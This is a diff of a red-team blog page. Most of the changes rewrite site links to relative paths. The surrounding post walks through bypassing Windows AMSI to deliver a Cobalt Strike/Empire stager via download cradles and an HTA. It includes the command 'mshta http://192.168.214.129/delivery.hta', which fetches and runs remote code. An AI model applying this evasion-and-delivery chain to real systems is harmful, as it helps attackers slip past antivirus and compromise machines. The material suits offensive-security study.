@@ -5,14 +5,14 @@
     <meta name="description" content="Offensive Security Engineering &amp; Shenanigans">
     <meta name="Author" content="Rasta Mouse">
     <meta name="keywords" content="offensive security red team pentesting">
-    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
-    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <link rel="stylesheet" href=/rastamouse.me-old_blog/css/syntax.css>
+    <link rel="stylesheet" href=/rastamouse.me-old_blog/css/style.css>
     <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
     <title>Cheesy Rumbles</title>
   </head><body><aside id="sidenav">
     <header>
     
-        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        <a href=https://rastamouse.me><img src="/rastamouse.me-old_blog/avatar.png" alt="avatar"></a>
         
     
 
@@ -26,7 +26,7 @@
     <nav>
         
             		
-            <a href="/"
+            <a href="/rastamouse.me-old_blog/"
                 
             >
                 <i class="fas fa-home fa-sm"></i>
@@ -34,7 +34,7 @@
             </a>
         
             		
-            <a href="/blog/"
+            <a href="/rastamouse.me-old_blog/blog/"
                 
             >
                 <i class="fas fa-keyboard fa-ms"></i>
@@ -42,7 +42,7 @@
             </a>
         
             		
-            <a href="/tags"
+            <a href="/rastamouse.me-old_blog/tags"
                 
             >
                 <i class="fas fa-tags fa-ms"></i>
@@ -70,7 +70,7 @@
             </a>
         
             		
-            <a href="/index.xml"
+            <a href="/rastamouse.me-old_blog/index.xml"
                 
             >
                 <i class="fas fa-rss fa-ms"></i>
@@ -93,7 +93,7 @@
     <li><a href="#hta">HTA</a></li>
   </ul>
 </nav>
-    <p>In <a href="/2018/10/amsiscanbuffer-bypass---part-1/">Part 1</a>, we had a brief look at the AmsiScanBuffer bypass technique.  We found some circumstances where the bypass code would be identified as malicious before it could be executed (which turned out to be a simple string detection), and modified the code to circumvent this.</p>
+    <p>In <a href="/rastamouse.me-old_blog/2018/10/amsiscanbuffer-bypass---part-1/">Part 1</a>, we had a brief look at the AmsiScanBuffer bypass technique.  We found some circumstances where the bypass code would be identified as malicious before it could be executed (which turned out to be a simple string detection), and modified the code to circumvent this.</p>
 <p>In this post, we&rsquo;ll explore a delivery method to help stage a Cobalt Strike / Empire / &lt;insert framework here&gt; agent.  As with Part 1, this is not about some 1337 code drop - it&rsquo;s a demonstration of how I walked through engineering the final result.</p>
 <p>So, let&rsquo;s get cracking.</p>
 <p>Before we start, we have a few goals in mind:</p>
@@ -108,7 +108,7 @@
 <h2 id="generate-stager">Generate Stager</h2>
 <p>We&rsquo;ll start by generating a simple stager, host it on a web server and just verify that AMSI does indeed prevent it from running.  We&rsquo;ll be serving these payloads using download cradles, so it&rsquo;s always worth making sure they behave as you expect.</p>
 <figure>
-    <img src="/images/asb-bypass-pt2/stager-iex.png"/> 
+    <img src="/rastamouse.me-old_blog/images/asb-bypass-pt2/stager-iex.png"/> 
 </figure>
 
 <h2 id="amsi-bypass">AMSI Bypass</h2>
@@ -116,18 +116,18 @@
 <!-- raw HTML omitted -->
 <p>We&rsquo;ll then test it out by downloading and executing it, then running the stager that failed earlier.</p>
 <p><figure>
-    <img src="/images/asb-bypass-pt2/stager-manual.png"/> 
+    <img src="/rastamouse.me-old_blog/images/asb-bypass-pt2/stager-manual.png"/> 
 </figure>
 
 <figure>
-    <img src="/images/asb-bypass-pt2/agent-manual.png"/> 
+    <img src="/rastamouse.me-old_blog/images/asb-bypass-pt2/agent-manual.png"/> 
 </figure>
 </p>
 <p>All good so far.</p>
 <p>Next step is to hook in the logic for deciding whether the AMSI bypass was successful.  There are a couple of opportunities in the <code>Disable()</code> function where it returns an <code>int</code> of <code>1</code> if something fails and <code>0</code> if it makes it to the end.</p>
 <p>So in pseudo-code we can say something like <code>execute bypass; if (bypass -eq &quot;0&quot;) { execute stager }</code>.  If <code>bypass</code> returns <code>1</code>, we naturally don&rsquo;t do anything more.</p>
 <figure>
-    <img src="/images/asb-bypass-pt2/logic.png"/> 
+    <img src="/rastamouse.me-old_blog/images/asb-bypass-pt2/logic.png"/> 
 </figure>
 
 <h2 id="hta">HTA</h2>
@@ -147,7 +147,7 @@
 &lt;/script&gt;
 </code></pre><p>Finally, we host the HTA and test it with <code>C:\Users\Rasta&gt;mshta http://192.168.214.129/delivery.hta</code>.</p>
 <figure>
-    <img src="/images/asb-bypass-pt2/hta-delivery.png"/> 
+    <img src="/rastamouse.me-old_blog/images/asb-bypass-pt2/hta-delivery.png"/> 
 </figure>
 
 <p>The web logs show us exactly what we expect.</p>
@@ -175,13 +175,13 @@
     <div class="nav-next-prev">
         <div class="nav-prev">
             
-                <a href="https://rastamouse.me/blog/dot-net/"><i class="fas fa-chevron-left"></i></a>
+                <a href="/rastamouse.me-old_blog/blog/dot-net/"><i class="fas fa-chevron-left"></i></a>
             
         </div>
         <a class="nav-top" href="#">top</i></a>
         <div class="nav-next">
             
-                <a href="https://rastamouse.me/blog/asb-bypass-pt3/"><i class="fas fa-chevron-right"></i></a>
+                <a href="/rastamouse.me-old_blog/blog/asb-bypass-pt3/"><i class="fas fa-chevron-right"></i></a>
             
         </div>
     </div>
@@ -196,5 +196,5 @@
 </div>
 </footer></main>
     </body>
-    <script src=https://rastamouse.me/js/navbutton.js></script>
+    <script src=/rastamouse.me-old_blog/js/navbutton.js></script>
 </html>
